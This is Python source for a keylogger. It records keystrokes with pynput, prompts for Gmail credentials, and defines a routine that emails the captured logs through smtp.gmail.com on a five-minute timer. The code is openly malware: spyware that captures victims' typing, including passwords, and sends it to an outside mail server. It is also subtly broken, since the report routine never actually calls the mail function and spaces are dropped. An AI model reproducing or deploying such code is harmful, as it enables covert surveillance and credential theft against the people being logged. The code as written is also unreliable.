import smtplib #for sending the email
import datetime
from pynput import keyboard #for monitoring keystrokes
from threading import Timer

class Keylogger:
	def __init__(self, interval=300):
		self.interval = interval #variable that stores all captured keystrokes
		self.logs = ""

	def handle_key_press(self,key):
		try:
			self.logs += key.char

		except AttributeError:
			if key == keyboard.Key.backspace:
				#removes the last character from logs when backspace is pressed
				self.logs = self.logs[:-1]

			elif key == keyboard.Key.enter:
				#add new line when enter ids pressed
				self.logs += '[ENTER]\n'

			elif key == keyboard.Key.space:
				#pynput does not register space by default, so we handle this manually
				self.logs += ''

			else:
				pass

	def request_mail_credentials(self):
		self.email = input('Enter your email: ')
		self.password = input('Enter your password: ')

	def send_mail(self, email, password, msg):
	    try:
	        # you can change the smtp server and port, if you use a different mail 
	        # service provider.
	        server = smtplib.SMTP('smtp.gmail.com', 587)
	        server.ehlo()
	        server.starttls()
	        server.login(email, password)
	        server.sendmail(email, email, msg)
	    except Exception as e:
	        print('An error occurred: ', e)
	    finally:
	        server.quit()

	def report(self):
		#send the email only if keystrokes have been captured

		if self.logs:
			log_date = datetime.datetime.now()
			msg = f'subject: Log info {log_date}\n' + self.logs
			self.logs = ''
			timer = Timer(interval=self.interval, function=self.report)
			timer.daemon = True
			timer.start()

	def start(self):
		#request the email and password
		self.request_mail_credentials()

		#start reporting the keylogs
		self.report()

		#start listening for keystrokes
		with keyboard.Listener(on_release=self.handle_key_press) as listener:
			listener.join()


if __name__ == '__main__':
	keylogger = Keylogger(interval=300)
	keylogger.start()
